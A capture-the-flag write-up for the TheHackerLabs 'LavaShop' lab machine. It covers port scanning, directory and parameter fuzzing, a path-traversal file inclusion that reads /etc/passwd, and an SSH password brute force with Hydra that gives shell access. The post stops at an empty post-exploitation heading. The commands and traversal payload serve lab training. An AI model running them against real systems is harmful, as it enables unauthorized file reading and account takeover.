---
title: LavaShop - TheHackerLabs WriteUp
description: Local File Inclusion (LFI) & SSH Brute Force.
author: ZoldyckSec
date: 2026-02-07 12:00:00 -0800
categories: [CTF Practice, TheHackerLabs]                
tags: [CTF, Lavashop, Easy, Linux, TheHackerLabs]
render_with_liquid: false
image:
---

## Description 

- `Date` Feb 7, 2026
- `Machine` LavaShop (Linux)
- `Difficulty` Easy
- `Prepared by` Allan Espinoza(Aka.ZoldyckSec)

## Summary

LavaShop machine from The Hackers Labs, we explore an attack vector that begins with the enumeration of hidden parameters through fuzzing, leading to a Local File Inclusion (LFI) vulnerability. After gaining initial access via SSH brute force, we move into a post-exploitation phase focused on gathering sensitive information from the system environment.

## Reconnaissance

#### Port Scanning

```bash
nmap -p- --open -sS --min-rate 5555 -vvv -n -Pn 192.168.1.106 -oG allPorts 
```

The scan reveals three open ports:

- Port 22: SSH
- Port 80: HTTP
- Port 1337  WASTE

#### Service & Versions

```bash
nmap -p22,80,1337 -sCV 192.168.1.106 -oN targeted 
```

```markdown
 
 PORT     STATE SERVICE VERSION
 22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
 | ssh-hostkey: 
 |   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)
 |_  256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)
 80/tcp   open  http    Apache httpd 2.4.62
 |_http-title: LavaShop
 |_http-server-header: Apache/2.4.62 (Debian)
 1337/tcp open  waste?
```

#### Web Application Analysis

Web application on port 80 reveals a login interface:

![Desktop View](/assets/img/Coolpg/webpanel.png){: width="972" height="589" }
_Full screen width and center alignment_

- Footer Domain: lavashop.th

#### Domain successfully verified

```bash
curl -I http://lavashop.thl/
HTTP/1.1 200 OK
Date: Sun, 22 Feb 2026 23:57:43 GMT
Server: Apache/2.4.62 (Debian)
Content-Type: text/html; charset=UTF-8
```

#### Technologies identified

```bash
whatweb http://lavashop.thl/
http://lavashop.thl/ [200 OK] Apache[2.4.62], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], IP[192.168.1.106], Title[LavaShop]
```
> Programming lenguages: `PHP`Â (Identified by Wappalyzer).

#### Web enumeration

Once the domain has been verified, we list.

```bash
ffuf -c -ic -fc 403 -v -u http://lavashop.thl/FUZZ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .php,.html,.txt
```
```markdown
[Status: 200, Size: 1539, Words: 192, Lines: 45, Duration: 6ms]
| URL | http://lavashop.thl/
    * FUZZ: 

[Status: 200, Size: 1539, Words: 192, Lines: 45, Duration: 8ms]
| URL | http://lavashop.thl/index.php
    * FUZZ: index.php

[Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 1ms]
| URL | http://lavashop.thl/pages
| --> | http://lavashop.thl/pages/
    * FUZZ: pages

[Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 4ms]
| URL | http://lavashop.thl/assets
| --> | http://lavashop.thl/assets/
    * FUZZ: assets

[Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 0ms]
| URL | http://lavashop.thl/includes
| --> | http://lavashop.thl/includes/
    * FUZZ: includes
```

Three endpoints are discovered, but are status 301(**Moved Permanently**)

- `pages` -  Forbidden
- `assets` - Forbidden
- `includes` - Forbidden

#### File Discovery in /pages/ Directory

After discovering the `/pages/` endpoint, I used `ffuf` to discover existing files within this directory. Since the application seems to be running PHP

```bash
ffuf -c -ic -fc 403 -v -u http://lavashop.thl/pages/FUZZ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .php,.html,.txt
```
```markdown
```bash
[Status: 200, Size: 139, Words: 8, Lines: 5, Duration: 3ms]
| URL | http://lavashop.thl/pages/contact.php
    * FUZZ: contact.php

[Status: 200, Size: 208, Words: 33, Lines: 6, Duration: 5ms]
| URL | http://lavashop.thl/pages/about.php
    * FUZZ: about.php

[Status: 200, Size: 195, Words: 22, Lines: 6, Duration: 3ms]
| URL | http://lavashop.thl/pages/home.php
    * FUZZ: home.php

[Status: 200, Size: 1017, Words: 189, Lines: 27, Duration: 2ms]
| URL | http://lavashop.thl/pages/products.php
    * FUZZ: products.php
```
The fuzzing successfully discovered four accessible PHP resources:

- `contact.php`
- `about.php`
- `home.php`
- `products.php` (Noticeably larger in response size, making it an interesting target for further investigation).

## Vulnerability Discovery (LFI)

#### Parameter Discovery: The Manual Approach

Looking closely at the directory fuzzing results, one detail immediately caught my attention: the size of `products.php` (1017 bytes) was significantly larger than the other pages, which hovered around 130-200 bytes. In web assessments, this kind of discrepancy usually indicates dynamic content or a page that requires user interaction.

Trusting my intuition, I decided to manually test common parameters associated with file inclusion vulnerabilities (such as `?page=`, `?doc=`, and `?file=`).

#### Automating Parameter Discovery with ffuf

While manual discovery based on intuition worked perfectly in this scenario, in larger applications with hundreds of endpoints

```bash
ffuf -c -u 'http://lavashop.thl/pages/products.php?FUZZ=test' -w /usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt -fs 1017
```

**How this command works:**

- `?FUZZ=test`: `ffuf` will replace the word `FUZZ` with common parameter names from the SecLists wordlist (e.g., `id=test`, `page=test`, `file=test`).
- `-fs 1017`**: This is the Filter Size flag. Since we know the default page size is 1017 bytes, we tell `ffuf` to hide any response with that exact size. It will only print out results where the parameter actually altered the page's behavior, keeping our output clean.

## Explotation

Now that we have identified the vulnerable `file` parameter, we can proceed to exploit it.

#### LFI Proof of Concept (PoC)

To confirm the Local File Inclusion (LFI) vulnerability, I attempted a basic directory traversal attack to read a known local file. In Linux, `/etc/passwd` is the standard target.

By navigating to:
```markdown
http://lavashop.thl/pages/products.php?file=../../../../../../etc/passwd
```

The server successfully returned the contents of the file:

```markdown
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
debian:x:1000:1000:debian,,,:/home/debian:/bin/bash
Rodri:x:1001:1001::/home/Rodri:/bin/bash
```
> This confirms that the PHP application takes the user input from the `file` parameter and passes it into an include function without properly sanitizing the `../`

#### Access: SSH Brute Forcing

By reading the `/etc/passwd` file via the LFI vulnerability, I identified two potential targets with console access (`/bin/bash`): `debian` and `Rodri`.

Using Hydra and the `rockyou.txt` wordlist against the SSH service (port 22):

```bash
hydra -l debian -P /usr/share/wordlists/rockyou.txt -f ssh://192.168.1.106
```
```markdown
```markdown 
[DATA] attacking ssh://192.168.1.106:22/
[22][ssh] host: 192.168.1.106   login: debian   password: 12345
```

#### Access SSH

```bash
ssh debian@192.168.1.106
```
```markdown
debian@Thehackerslabs-LavaShop:/$ whoami
debian
```

## Post-Explotation





